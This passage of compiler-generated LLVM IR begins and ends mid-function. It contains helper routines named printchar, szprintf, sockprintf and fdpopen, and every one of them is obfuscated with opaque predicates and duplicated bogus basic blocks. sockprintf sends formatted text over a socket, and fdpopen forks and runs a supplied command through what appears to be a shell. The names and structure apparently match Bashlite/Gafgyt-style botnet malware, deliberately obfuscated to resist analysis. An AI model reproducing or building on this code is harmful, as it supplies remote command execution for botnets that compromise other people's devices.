; <label>:101:                                    ; preds = %originalBBpart28
  %102 = load i32, i32* %21, align 4
  %103 = load i32, i32* %11, align 4
  %104 = urem i32 %102, %103
  store i32 %104, i32* %18, align 4
  %105 = load i32, i32* %18, align 4
  %106 = icmp sge i32 %105, 10
  br i1 %106, label %107, label %113

; <label>:107:                                    ; preds = %101
  %108 = load i32, i32* %15, align 4
  %109 = sub nsw i32 %108, 48
  %110 = sub nsw i32 %109, 10
  %111 = load i32, i32* %18, align 4
  %112 = add nsw i32 %111, %110
  store i32 %112, i32* %18, align 4
  br label %113

; <label>:113:                                    ; preds = %107, %101
  %114 = load i32, i32* @x.11
  %115 = load i32, i32* @y.12
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %113
  %122 = load i32, i32* %18, align 4
  %123 = add nsw i32 %122, 48
  %124 = trunc i32 %123 to i8
  %125 = load i8*, i8** %17, align 8
  %126 = getelementptr inbounds i8, i8* %125, i32 -1
  store i8* %126, i8** %17, align 8
  store i8 %124, i8* %126, align 1
  %127 = load i32, i32* %11, align 4
  %128 = load i32, i32* %21, align 4
  %129 = udiv i32 %128, %127
  store i32 %129, i32* %21, align 4
  %130 = load i32, i32* @x.11
  %131 = load i32, i32* @y.12
  %132 = sub i32 %130, 1
  %133 = mul i32 %130, %132
  %134 = urem i32 %133, 2
  %135 = icmp eq i32 %134, 0
  %136 = icmp slt i32 %131, 10
  %137 = or i1 %135, %136
  br i1 %137, label %originalBBpart227, label %originalBB10alteredBB

originalBBpart227:                                ; preds = %originalBB10
  br label %82

; <label>:138:                                    ; preds = %originalBBpart28
  %139 = load i32, i32* @x.11
  %140 = load i32, i32* @y.12
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %138
  %147 = load i32, i32* %19, align 4
  %148 = icmp ne i32 %147, 0
  %149 = load i32, i32* @x.11
  %150 = load i32, i32* @y.12
  %151 = sub i32 %149, 1
  %152 = mul i32 %149, %151
  %153 = urem i32 %152, 2
  %154 = icmp eq i32 %153, 0
  %155 = icmp slt i32 %150, 10
  %156 = or i1 %154, %155
  br i1 %156, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %148, label %157, label %174

; <label>:157:                                    ; preds = %originalBBpart231
  %158 = load i32, i32* %13, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %170

; <label>:160:                                    ; preds = %157
  %161 = load i32, i32* %14, align 4
  %162 = and i32 %161, 2
  %163 = icmp ne i32 %162, 0
  br i1 %163, label %164, label %170

; <label>:164:                                    ; preds = %160
  %165 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %165, i32 45)
  %166 = load i32, i32* %20, align 4
  %167 = add nsw i32 %166, 1
  store i32 %167, i32* %20, align 4
  %168 = load i32, i32* %13, align 4
  %169 = add nsw i32 %168, -1
  store i32 %169, i32* %13, align 4
  br label %173

; <label>:170:                                    ; preds = %160, %157
  %171 = load i8*, i8** %17, align 8
  %172 = getelementptr inbounds i8, i8* %171, i32 -1
  store i8* %172, i8** %17, align 8
  store i8 45, i8* %172, align 1
  br label %173

; <label>:173:                                    ; preds = %170, %164
  br label %174

; <label>:174:                                    ; preds = %173, %originalBBpart231
  %175 = load i32, i32* %20, align 4
  %176 = load i8**, i8*** %9, align 8
  %177 = load i8*, i8** %17, align 8
  %178 = load i32, i32* %13, align 4
  %179 = load i32, i32* %14, align 4
  %180 = call i32 @prints(i8** %176, i8* %177, i32 %178, i32 %179)
  %181 = add nsw i32 %175, %180
  store i32 %181, i32* %8, align 4
  br label %182

; <label>:182:                                    ; preds = %174, %25
  %183 = load i32, i32* %8, align 4
  ret i32 %183

originalBBalteredBB:                              ; preds = %originalBB, %33
  %184 = load i32, i32* %12, align 4
  %185 = icmp ne i32 %184, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %55
  %186 = load i32, i32* %10, align 4
  %187 = icmp slt i32 %186, 0
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %82
  %188 = load i32, i32* %21, align 4
  %189 = icmp ne i32 %188, 0
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %113
  %190 = load i32, i32* %18, align 4
  %_ = sub i32 %190, 48
  %gen = mul i32 %_, 48
  %_11 = sub i32 0, %190
  %gen12 = add i32 %_11, 48
  %_13 = sub i32 %190, 48
  %gen14 = mul i32 %_13, 48
  %_15 = shl i32 %190, 48
  %_16 = sub i32 %190, 48
  %gen17 = mul i32 %_16, 48
  %_18 = shl i32 %190, 48
  %_19 = shl i32 %190, 48
  %191 = add nsw i32 %190, 48
  %192 = trunc i32 %191 to i8
  %193 = load i8*, i8** %17, align 8
  %194 = getelementptr inbounds i8, i8* %193, i32 -1
  store i8* %194, i8** %17, align 8
  store i8 %192, i8* %194, align 1
  %195 = load i32, i32* %11, align 4
  %196 = load i32, i32* %21, align 4
  %_20 = shl i32 %196, %195
  %_21 = shl i32 %196, %195
  %_22 = shl i32 %196, %195
  %_23 = sub i32 %196, %195
  %gen24 = mul i32 %_23, %195
  %197 = udiv i32 %196, %195
  store i32 %197, i32* %21, align 4
  br label %originalBB10

originalBB29alteredBB:                            ; preds = %originalBB29, %138
  %198 = load i32, i32* %19, align 4
  %199 = icmp ne i32 %198, 0
  br label %originalBB29
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %31

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* @x.13
  %9 = load i32, i32* @y.14
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load i8**, i8*** %3, align 8
  %19 = load i8*, i8** %18, align 8
  store i8 %17, i8* %19, align 1
  %20 = load i8**, i8*** %3, align 8
  %21 = load i8*, i8** %20, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %20, align 8
  %23 = load i32, i32* @x.13
  %24 = load i32, i32* @y.14
  %25 = sub i32 %23, 1
  %26 = mul i32 %23, %25
  %27 = urem i32 %26, 2
  %28 = icmp eq i32 %27, 0
  %29 = icmp slt i32 %24, 10
  %30 = or i1 %28, %29
  br i1 %30, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %50

; <label>:31:                                     ; preds = %2
  %32 = load i32, i32* @x.13
  %33 = load i32, i32* @y.14
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %31
  %40 = bitcast i32* %4 to i8*
  %41 = call i64 @write(i32 1, i8* %40, i64 1)
  %42 = load i32, i32* @x.13
  %43 = load i32, i32* @y.14
  %44 = sub i32 %42, 1
  %45 = mul i32 %42, %44
  %46 = urem i32 %45, 2
  %47 = icmp eq i32 %46, 0
  %48 = icmp slt i32 %43, 10
  %49 = or i1 %47, %48
  br i1 %49, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %50

; <label>:50:                                     ; preds = %originalBBpart24, %originalBBpart2
  %51 = load i32, i32* @x.13
  %52 = load i32, i32* @y.14
  %53 = sub i32 %51, 1
  %54 = mul i32 %51, %53
  %55 = urem i32 %54, 2
  %56 = icmp eq i32 %55, 0
  %57 = icmp slt i32 %52, 10
  %58 = or i1 %56, %57
  br i1 %58, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %50
  %59 = load i32, i32* @x.13
  %60 = load i32, i32* @y.14
  %61 = sub i32 %59, 1
  %62 = mul i32 %59, %61
  %63 = urem i32 %62, 2
  %64 = icmp eq i32 %63, 0
  %65 = icmp slt i32 %60, 10
  %66 = or i1 %64, %65
  br i1 %66, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %7
  %67 = load i32, i32* %4, align 4
  %68 = trunc i32 %67 to i8
  %69 = load i8**, i8*** %3, align 8
  %70 = load i8*, i8** %69, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i8**, i8*** %3, align 8
  %72 = load i8*, i8** %71, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %71, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  %74 = bitcast i32* %4 to i8*
  %75 = call i64 @write(i32 1, i8* %74, i64 1)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %50
  br label %originalBB6
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #2

declare i64 @write(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8*, ...) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  store i8* %1, i8** %4, align 8
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %7 = bitcast %struct.__va_list_tag* %6 to i8*
  call void @llvm.va_start(i8* %7)
  %8 = load i8*, i8** %4, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %5, i32 0, i32 0
  %10 = call i32 @print(i8** %3, i8* %8, %struct.__va_list_tag* %9)
  ret i32 %10
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8*, ...) #0 {
  %3 = load i32, i32* @x.17
  %4 = load i32, i32* @y.18
  %5 = sub i32 %3, 1
  %6 = mul i32 %3, %5
  %7 = urem i32 %6, 2
  %8 = icmp eq i32 %7, 0
  %9 = icmp slt i32 %4, 10
  %10 = or i1 %8, %9
  br i1 %10, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %2
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i8*, align 8
  %15 = alloca [1 x %struct.__va_list_tag], align 16
  %16 = alloca i32, align 4
  store i32 %0, i32* %11, align 4
  store i8* %1, i8** %12, align 8
  %17 = call noalias i8* @malloc(i64 2048) #2
  store i8* %17, i8** %13, align 8
  %18 = load i8*, i8** %13, align 8
  call void @llvm.memset.p0i8.i64(i8* %18, i8 0, i64 2048, i32 1, i1 false)
  %19 = load i8*, i8** %13, align 8
  store i8* %19, i8** %14, align 8
  %20 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %21 = bitcast %struct.__va_list_tag* %20 to i8*
  call void @llvm.va_start(i8* %21)
  %22 = load i8*, i8** %12, align 8
  %23 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %24 = call i32 @print(i8** %13, i8* %22, %struct.__va_list_tag* %23)
  %25 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %15, i32 0, i32 0
  %26 = bitcast %struct.__va_list_tag* %25 to i8*
  call void @llvm.va_end(i8* %26)
  %27 = load i8*, i8** %14, align 8
  %28 = load i8*, i8** %14, align 8
  %29 = call i64 @strlen(i8* %28) #10
  %30 = getelementptr inbounds i8, i8* %27, i64 %29
  store i8 10, i8* %30, align 1
  %31 = load i32, i32* %11, align 4
  %32 = load i8*, i8** %14, align 8
  %33 = load i8*, i8** %14, align 8
  %34 = call i64 @strlen(i8* %33) #10
  %35 = call i64 @send(i32 %31, i8* %32, i64 %34, i32 16384)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %16, align 4
  %37 = load i8*, i8** %14, align 8
  call void @free(i8* %37) #2
  %38 = load i32, i32* %16, align 4
  %39 = load i32, i32* @x.17
  %40 = load i32, i32* @y.18
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i32 %38

originalBBalteredBB:                              ; preds = %originalBB, %2
  %47 = alloca i32, align 4
  %48 = alloca i8*, align 8
  %49 = alloca i8*, align 8
  %50 = alloca i8*, align 8
  %51 = alloca [1 x %struct.__va_list_tag], align 16
  %52 = alloca i32, align 4
  store i32 %0, i32* %47, align 4
  store i8* %1, i8** %48, align 8
  %53 = call noalias i8* @malloc(i64 2048) #2
  store i8* %53, i8** %49, align 8
  %54 = load i8*, i8** %49, align 8
  call void @llvm.memset.p0i8.i64(i8* %54, i8 0, i64 2048, i32 1, i1 false)
  %55 = load i8*, i8** %49, align 8
  store i8* %55, i8** %50, align 8
  %56 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %57 = bitcast %struct.__va_list_tag* %56 to i8*
  call void @llvm.va_start(i8* %57)
  %58 = load i8*, i8** %48, align 8
  %59 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %60 = call i32 @print(i8** %49, i8* %58, %struct.__va_list_tag* %59)
  %61 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %51, i32 0, i32 0
  %62 = bitcast %struct.__va_list_tag* %61 to i8*
  call void @llvm.va_end(i8* %62)
  %63 = load i8*, i8** %50, align 8
  %64 = load i8*, i8** %50, align 8
  %65 = call i64 @strlen(i8* %64) #10
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  store i8 10, i8* %66, align 1
  %67 = load i32, i32* %47, align 4
  %68 = load i8*, i8** %50, align 8
  %69 = load i8*, i8** %50, align 8
  %70 = call i64 @strlen(i8* %69) #10
  %71 = call i64 @send(i32 %67, i8* %68, i64 %70, i32 16384)
  %72 = trunc i64 %71 to i32
  store i32 %72, i32* %52, align 4
  %73 = load i8*, i8** %50, align 8
  call void @free(i8* %73) #2
  %74 = load i32, i32* %52, align 4
  br label %originalBB
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

declare i64 @send(i32, i8*, i64, i32) #3

; Function Attrs: nounwind
declare void @free(i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @fdpopen(i8*, i8*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca [2 x i32], align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %10 = load i8*, i8** %5, align 8
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  %13 = icmp ne i32 %12, 114
  br i1 %13, label %14, label %35

; <label>:14:                                     ; preds = %2
  %15 = load i32, i32* @x.19
  %16 = load i32, i32* @y.20
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %14
  %23 = load i8*, i8** %5, align 8
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 119
  %27 = load i32, i32* @x.19
  %28 = load i32, i32* @y.20
  %29 = sub i32 %27, 1
  %30 = mul i32 %27, %29
  %31 = urem i32 %30, 2
  %32 = icmp eq i32 %31, 0
  %33 = icmp slt i32 %28, 10
  %34 = or i1 %32, %33
  br i1 %34, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %26, label %41, label %35

; <label>:35:                                     ; preds = %originalBBpart2, %2
  %36 = load i8*, i8** %5, align 8
  %37 = getelementptr inbounds i8, i8* %36, i64 1
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp ne i32 %39, 0
  br i1 %40, label %41, label %42

; <label>:41:                                     ; preds = %35, %originalBBpart2
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:42:                                     ; preds = %35
  %43 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %44 = call i32 @pipe(i32* %43) #2
  %45 = icmp slt i32 %44, 0
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %42
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:47:                                     ; preds = %42
  %48 = load i32, i32* @x.19
  %49 = load i32, i32* @y.20
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = icmp eq i32* %56, null
  %58 = load i32, i32* @x.19
  %59 = load i32, i32* @y.20
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %57, label %66, label %102

; <label>:66:                                     ; preds = %originalBBpart24
  %67 = call i32 @getdtablesize() #2
  store i32 %67, i32* %8, align 4
  %68 = icmp sle i32 %67, 0
  br i1 %68, label %69, label %70

; <label>:69:                                     ; preds = %66
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:70:                                     ; preds = %66
  %71 = load i32, i32* %8, align 4
  %72 = sext i32 %71 to i64
  %73 = mul i64 %72, 4
  %74 = trunc i64 %73 to i32
  %75 = zext i32 %74 to i64
  %76 = call noalias i8* @malloc(i64 %75) #2
  %77 = bitcast i8* %76 to i32*
  store i32* %77, i32** @fdopen_pids, align 8
  %78 = icmp eq i32* %77, null
  br i1 %78, label %79, label %80

; <label>:79:                                     ; preds = %70
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:80:                                     ; preds = %70
  %81 = load i32, i32* @x.19
  %82 = load i32, i32* @y.20
  %83 = sub i32 %81, 1
  %84 = mul i32 %81, %83
  %85 = urem i32 %84, 2
  %86 = icmp eq i32 %85, 0
  %87 = icmp slt i32 %82, 10
  %88 = or i1 %86, %87
  br i1 %88, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %80
  %89 = load i32*, i32** @fdopen_pids, align 8
  %90 = bitcast i32* %89 to i8*
  %91 = load i32, i32* %8, align 4
  %92 = sext i32 %91 to i64
  %93 = mul i64 %92, 4
  call void @llvm.memset.p0i8.i64(i8* %90, i8 0, i64 %93, i32 1, i1 false)
  %94 = load i32, i32* @x.19
  %95 = load i32, i32* @y.20
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBBpart211, label %originalBB6alteredBB

originalBBpart211:                                ; preds = %originalBB6
  br label %102

; <label>:102:                                    ; preds = %originalBBpart211, %originalBBpart24
  %103 = call i32 @vfork() #11
  store i32 %103, i32* %9, align 4
  switch i32 %103, label %213 [
    i32 -1, label %104
    i32 0, label %111
  ]

; <label>:104:                                    ; preds = %102
  %105 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %106 = load i32, i32* %105, align 4
  %107 = call i32 @close(i32 %106)
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1, i32* %3, align 4
  br label %253

; <label>:111:                                    ; preds = %102
  %112 = load i8*, i8** %5, align 8
  %113 = load i8, i8* %112, align 1
  %114 = zext i8 %113 to i32
  %115 = icmp eq i32 %114, 114
  br i1 %115, label %116, label %179

; <label>:116:                                    ; preds = %111
  %117 = load i32, i32* @x.19
  %118 = load i32, i32* @y.20
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %116
  %125 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %126 = load i32, i32* %125, align 4
  %127 = icmp ne i32 %126, 1
  %128 = load i32, i32* @x.19
  %129 = load i32, i32* @y.20
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br i1 %127, label %136, label %159

; <label>:136:                                    ; preds = %originalBBpart215
  %137 = load i32, i32* @x.19
  %138 = load i32, i32* @y.20
  %139 = sub i32 %137, 1
  %140 = mul i32 %137, %139
  %141 = urem i32 %140, 2
  %142 = icmp eq i32 %141, 0
  %143 = icmp slt i32 %138, 10
  %144 = or i1 %142, %143
  br i1 %144, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %136
  %145 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @dup2(i32 %146, i32 1) #2
  %148 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %149 = load i32, i32* %148, align 4
  %150 = call i32 @close(i32 %149)
  %151 = load i32, i32* @x.19
  %152 = load i32, i32* @y.20
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br label %159

; <label>:159:                                    ; preds = %originalBBpart219, %originalBBpart215
  %160 = load i32, i32* @x.19
  %161 = load i32, i32* @y.20
  %162 = sub i32 %160, 1
  %163 = mul i32 %160, %162
  %164 = urem i32 %163, 2
  %165 = icmp eq i32 %164, 0
  %166 = icmp slt i32 %161, 10
  %167 = or i1 %165, %166
  br i1 %167, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %159
  %168 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %169 = load i32, i32* %168, align 4
  %170 = call i32 @close(i32 %169)
  %171 = load i32, i32* @x.19
  %172 = load i32, i32* @y.20
  %173 = sub i32 %171, 1
  %174 = mul i32 %171, %173
  %175 = urem i32 %174, 2
  %176 = icmp eq i32 %175, 0
  %177 = icmp slt i32 %172, 10
  %178 = or i1 %176, %177
  br i1 %178, label %originalBBpart223, label %originalBB21alteredBB

originalBBpart223:                                ; preds = %originalBB21
  br label %210

; <label>:179:                                    ; preds = %111
  %180 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %181 = load i32, i32* %180, align 4
  %182 = icmp ne i32 %181, 0
  br i1 %182, label %183, label %190

; <label>:183:                                    ; preds = %179
  %184 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %185 = load i32, i32* %184, align 4
  %186 = call i32 @dup2(i32 %185, i32 0) #2
  %187 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %188 = load i32, i32* %187, align 4
  %189 = call i32 @close(i32 %188)
  br label %190

; <label>:190:                                    ; preds = %183, %179
  %191 = load i32, i32* @x.19
  %192 = load i32, i32* @y.20
  %193 = sub i32 %191, 1
  %194 = mul i32 %191, %193
  %195 = urem i32 %194, 2
  %196 = icmp eq i32 %195, 0
  %197 = icmp slt i32 %192, 10
  %198 = or i1 %196, %197
  br i1 %198, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %190
  %199 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %200 = load i32, i32* %199, align 4
  %201 = call i32 @close(i32 %200)
  %202 = load i32, i32* @x.19
  %203 = load i32, i32* @y.20
  %204 = sub i32 %202, 1
  %205 = mul i32 %202, %204
  %206 = urem i32 %205, 2
  %207 = icmp eq i32 %206, 0
  %208 = icmp slt i32 %203, 10
  %209 = or i1 %207, %208
  br i1 %209, label %originalBBpart227, label %originalBB25alteredBB

originalBBpart227:                                ; preds = %originalBB25
  br label %210

; <label>:210:                                    ; preds = %originalBBpart227, %originalBBpart223
  %211 = load i8*, i8** %4, align 8
  %212 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.35, i32 0, i32 0), i8* %211, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

; <label>:213:                                    ; preds = %102
  %214 = load i8*, i8** %5, align 8
  %215 = load i8, i8* %214, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 114
  br i1 %217, label %218, label %224

; <label>:218:                                    ; preds = %213
  %219 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %220 = load i32, i32* %219, align 4
  store i32 %220, i32* %6, align 4
  %221 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %222 = load i32, i32* %221, align 4
  %223 = call i32 @close(i32 %222)
  br label %246

; <label>:224:                                    ; preds = %213
  %225 = load i32, i32* @x.19
  %226 = load i32, i32* @y.20
  %227 = sub i32 %225, 1
  %228 = mul i32 %225, %227
  %229 = urem i32 %228, 2
  %230 = icmp eq i32 %229, 0
  %231 = icmp slt i32 %226, 10
  %232 = or i1 %230, %231
  br i1 %232, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %224
  %233 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %234 = load i32, i32* %233, align 4
  store i32 %234, i32* %6, align 4
  %235 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %236 = load i32, i32* %235, align 4
  %237 = call i32 @close(i32 %236)
  %238 = load i32, i32* @x.19
  %239 = load i32, i32* @y.20
  %240 = sub i32 %238, 1
  %241 = mul i32 %238, %240
  %242 = urem i32 %241, 2
  %243 = icmp eq i32 %242, 0
  %244 = icmp slt i32 %239, 10
  %245 = or i1 %243, %244
  br i1 %245, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br label %246

; <label>:246:                                    ; preds = %originalBBpart231, %218
  %247 = load i32, i32* %9, align 4
  %248 = load i32*, i32** @fdopen_pids, align 8
  %249 = load i32, i32* %6, align 4
  %250 = sext i32 %249 to i64
  %251 = getelementptr inbounds i32, i32* %248, i64 %250
  store i32 %247, i32* %251, align 4
  %252 = load i32, i32* %6, align 4
  store i32 %252, i32* %3, align 4
  br label %253

; <label>:253:                                    ; preds = %246, %104, %79, %69, %46, %41
  %254 = load i32, i32* %3, align 4
  ret i32 %254

originalBBalteredBB:                              ; preds = %originalBB, %14
  %255 = load i8*, i8** %5, align 8
  %256 = load i8, i8* %255, align 1
  %257 = zext i8 %256 to i32
  %258 = icmp ne i32 %257, 119
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %47
  %259 = load i32*, i32** @fdopen_pids, align 8
  %260 = icmp eq i32* %259, null
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %80
  %261 = load i32*, i32** @fdopen_pids, align 8
  %262 = bitcast i32* %261 to i8*
  %263 = load i32, i32* %8, align 4
  %264 = sext i32 %263 to i64
  %_ = sub i64 0, %264
  %gen = add i64 %_, 4
  %_7 = sub i64 0, %264
  %gen8 = add i64 %_7, 4
  %_9 = shl i64 %264, 4
  %265 = mul i64 %264, 4
  call void @llvm.memset.p0i8.i64(i8* %262, i8 0, i64 %265, i32 1, i1 false)
  br label %originalBB6

originalBB13alteredBB:                            ; preds = %originalBB13, %116
